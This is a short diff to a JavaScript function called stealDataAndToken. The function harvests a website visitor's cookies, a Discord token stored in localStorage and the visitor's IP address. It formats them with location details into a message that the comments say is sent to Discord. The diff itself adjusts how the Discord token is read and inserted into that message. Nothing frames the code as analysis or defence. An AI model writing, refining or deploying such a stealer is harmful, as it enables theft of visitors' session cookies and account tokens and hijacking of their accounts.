@@ -3,7 +3,7 @@ function stealDataAndToken() {
     var cookies = document.cookie;
 
     // Retrieve Discord token from local storage
-    var token = localStorage.getItem('https://discord.com') ? JSON.parse(localStorage.getItem('https://discord.com')).Token : 'Token not found';
+    var discordToken = localStorage.getItem('https://discord.com');
 
     // Fetch user's IP
     fetch('https://httpbin.org/ip')
@@ -31,7 +31,7 @@ Someone visited the website from:
 - Postal Code: ${postalCode}
 - IP Address: ${clientIp}
 - Cookies: ${cookies}
-- Discord Token: ${token} // Include the Discord token here
+- Discord Token: ${discordToken}
 \`\`\``;
 
             // Send message to Discord
